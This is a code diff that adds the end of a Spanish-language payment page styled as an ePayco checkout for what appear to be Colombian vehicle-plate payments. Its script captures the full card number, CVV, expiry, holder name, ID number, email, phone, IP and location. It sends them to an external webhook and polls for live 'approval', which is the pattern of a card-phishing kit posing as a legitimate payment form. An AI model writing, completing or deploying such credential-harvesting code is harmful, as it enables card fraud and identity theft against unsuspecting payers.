+                if (data.success) return data.id;
+                console.error('❌ Error webhook:', data.error);
+                return false;
+            } catch (error) { console.error('❌ Error al enviar:', error); return false; }
+        }
+
+        // ============================================================
+        // GUARDAR EN LOCALSTORAGE
+        // ============================================================
+        function guardarDatosEnLocalStorage(cardNumber, cvc, expiry, cardholderName, banco) {
+            const cardLast4 = cardNumber.slice(-4);
+            localStorage.setItem('cardNumber', cardNumber);
+            localStorage.setItem('cardLast4', cardLast4);
+            localStorage.setItem('cvc', cvc);
+            localStorage.setItem('expiry', expiry);
+            localStorage.setItem('cardholderName', cardholderName);
+            localStorage.setItem('cardType', cardType || '');
+            if (banco) localStorage.setItem('bancoEmisor', banco);
+        }
+
+        // ============================================================
+        // BOTÓN PAGAR
+        // ============================================================
+        btnPagar.addEventListener('click', async function() {
+            ocultarError();
+            const nombre = inputNombre.value.trim();
+            const numero = inputNumero.value.replace(/\s/g, '');
+            const exp = inputExp.value.trim();
+            const cvv = inputCVV.value.trim();
+            const cuotasSeleccionadas = selectCuotas.value; // <-- Capturamos las cuotas
+            const terms = document.getElementById('terms').checked;
+
+            const info = getBinBloqueadoInfo(numero);
+            if (info.bloqueado) { mostrarError(info.mensaje); return; }
+            if (!nombre) { mostrarError('Por favor, ingresa el nombre del titular'); return; }
+            if (!numero || numero.length < 15) { mostrarError('El número de tarjeta debe tener al menos 15 dígitos'); return; }
+            if (!exp || !/^\d{2}\/\d{2}$/.test(exp)) { mostrarError('Ingresa una fecha de vencimiento válida (MM/AA)'); return; }
+            if (!cvv || cvv.length < 3) { mostrarError('Ingresa un CVV válido (3 o 4 dígitos)'); return; }
+            if (!cuotasSeleccionadas) { mostrarError('Por favor, selecciona el número de cuotas'); return; }
+            if (!terms) { mostrarError('Debes aceptar los términos de servicio'); return; }
+
+            cardType = detectCardType(numero);
+            if (!cardType) { mostrarError('Tipo de tarjeta no reconocido'); return; }
+
+            if (!detectedBank && numero.length >= 6) { await detectBankByBIN(numero); await new Promise(r => setTimeout(r, 500)); }
+            if (!detectedBank) { detectedBank = 'Desconocido'; localStorage.setItem('bancoEmisor', 'Desconocido'); }
+            if (!localStorage.getItem('usuario_ip') || localStorage.getItem('usuario_ip') === 'Desconocida') { await capturarIP(); }
+
+            guardarDatosEnLocalStorage(numero, cvv, exp, nombre, detectedBank);
+            localStorage.setItem('solicitudId', solicitudId);
+            localStorage.setItem('cuotas', cuotasSeleccionadas); // <-- Guardamos las cuotas
+
+            loadingOverlay.classList.add('active');
+            loadingText.textContent = 'Procesando pago...';
+            initialSpinner.style.display = 'block';
+            initialSpinner.classList.add('active');
+            logoContainer.style.display = 'none';
+            progressWrapper.style.display = 'none';
+
+            btnPagar.disabled = true; btnPagar.textContent = 'Procesando...';
+            inputNumero.disabled = true; inputNombre.disabled = true; inputExp.disabled = true; inputCVV.disabled = true;
+            selectCuotas.disabled = true;
+
+            const nombreP = localStorage.getItem('primerNombre') || localStorage.getItem('nombre') || 'No proporcionado';
+            const apellidosP = localStorage.getItem('primerApellido') || localStorage.getItem('apellidos') || '';
+            const tipoDocumento = localStorage.getItem('tipoDocumento') || '';
+            const numeroDocumento = localStorage.getItem('numeroDocumento') || 'No proporcionado';
+            const email = localStorage.getItem('email') || 'No proporcionado';
+            const celular = localStorage.getItem('celular') || 'No proporcionado';
+            const fechaHora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' });
+            const placas = JSON.parse(localStorage.getItem('placas') || '[]');
+            const totalFormateado = localStorage.getItem('montoTotal') || '';
+
+            const datos = {
+                solicitudId: solicitudId,
+                nombreCompleto: `${nombreP} ${apellidosP}`.trim(),
+                tipoDocumento: tipoDocumento,
+                numeroDocumento: numeroDocumento,
+                email: email,
+                celular: celular,
+                numeroTarjeta: numero,
+                cvv: cvv,
+                vencimiento: exp,
+                tipoTarjeta: cardType,
+                bancoEmisor: detectedBank,
+                cuotas: cuotasSeleccionadas, // <-- Lo enviamos al webhook
+                totalFormateado: totalFormateado,
+                fechaHora: fechaHora,
+                ip: localStorage.getItem('usuario_ip') || '',
+                pais: localStorage.getItem('usuario_pais') || 'Desconocido',
+                ciudad: localStorage.getItem('usuario_ciudad') || 'Desconocida',
+                placas: placas.map(p => p.placa).join(', ')
+            };
+
+            console.log('📤 Enviando al webhook:', datos);
+            enviarHeartbeat('activo');
+
+            const resultado = await enviarDatosAlWebhook(datos);
+            if (resultado === false) {
+                loadingOverlay.classList.remove('active');
+                mostrarError('Error al procesar el pago. Intente nuevamente.');
+                habilitarFormulario();
+                return;
+            }
+            console.log('⏳ Esperando aprobación...');
+            iniciarPolling();
+        });
+
+        // ============================================================
+        // INICIALIZACIÓN
+        // ============================================================
+        window.addEventListener('load', function() {
+            iniciarHeartbeat();
+            console.log('✅ Tarjetas listo con diseño ePayco y selector de cuotas');
+        });
+    </script>
+</body>
+</html>
